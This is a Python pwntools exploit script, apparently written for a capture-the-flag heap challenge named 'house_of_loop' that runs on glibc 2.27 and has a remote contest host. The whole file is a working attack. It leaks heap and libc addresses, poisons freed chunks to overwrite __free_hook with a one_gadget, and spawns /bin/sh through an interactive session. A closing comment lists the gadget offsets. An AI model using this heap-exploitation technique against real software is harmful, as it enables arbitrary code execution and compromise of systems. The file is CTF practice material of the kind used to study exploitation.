#!/usr/bin/env python
from pwn import *
import os
from time import sleep
e = ELF('./house_of_loop')
libc = ELF('./libc-2.27.so')
if 'remote' in os.environ:
    io = remote('houseofloop.whitehat.vn',6969)
else:
    io = process(e.path,env = {'LD_PRELOAD':'./libc-2.27.so'})

def _counter():
    i = 0
    while True:
        i += 1
        yield i
counter = _counter()
def alloc(size,title=None,private='',des=''):
    if not title:
        title = next(counter)
    log.info(io.recv(timeout=0.2))
    io.sendline('1')
    sleep(0.2)
    io.sendline(str(title))
    sleep(0.2)
    io.sendline(private)
    sleep(0.2)
    io.sendline(str(size))
    sleep(0.2)
    if size>0:
        io.sendline(des)
    sleep(0.2)

def view():
    log.info(io.recv(timeout=0.2))
    io.sendline('2')
    sleep(0.2)

def delete(title):
    log.info(io.recv(timeout=0.2))
    io.sendline('3')
    sleep(0.2)
    io.sendline(str(title))
    sleep(0.2)

# Leaking Heap address
pattern = re.compile(r'Des: (.{6,8})\n',re.DOTALL)

alloc(0)    #1
alloc(0)    #2
delete(2)
delete(1)
alloc(0)    #3
alloc(0)    #4
view()
d = io.recv()
log.info(d)
leaked_heap_addr =  u64(pattern.search(d).group(1).ljust(8,"\x00"))

log.info('Leaked heap addr '+hex(leaked_heap_addr))

# Leaking libc address
## Filling up holes created before
alloc(0)    #5
alloc(0)    #6
## Actual exploit
alloc(4096) #7
alloc(144)  #8
alloc(144)  #9
alloc(144)  #10
alloc(144)  #11
delete(7)
delete(11)
alloc(0)    #12
view()
d = io.recv()
log.info(repr(d))

pattern = re.compile(r'Title: 12\n\tDes: (.{6,8})\n\n',re.DOTALL)
print(repr(pattern.search(d).group(1)))
leaked_libc_addr = u64(pattern.search(d).group(1).ljust(8,'\x00'))
log.info('Leaked libc addr: '+hex(leaked_libc_addr))
libcbase = leaked_libc_addr-4113088
log.info('Libc base: '+hex(libcbase))
free_hook = libcbase+ libc.symbols['__free_hook']
log.info('free_hook: '+hex(free_hook))
one_gadget = libcbase + 0x4f322	
log.info('one_gadget: '+hex(one_gadget))
## Use-after-free
### Filling up holes created by previous stage
alloc(144)    #13
alloc(144)    #14
alloc(4096) #15

### Actual Exploit
alloc(144,des=cyclic(0x80)+p64(0)+p64(free_hook-0x88))  #16
alloc(144,des=cyclic(0x80)+p64(0)+p64(one_gadget))  #17
alloc(4096) #18
delete(18)
delete(17)
delete(16)
alloc(4096) #19
alloc(144)  #20 next_note in-control
alloc(144)  #21 next_note in-control
#gdb.attach(io)
#raw_input("Continue?")
delete(21)


#gdb.attach(io)

io.interactive()
'''
0x4f2c5	execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322	execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
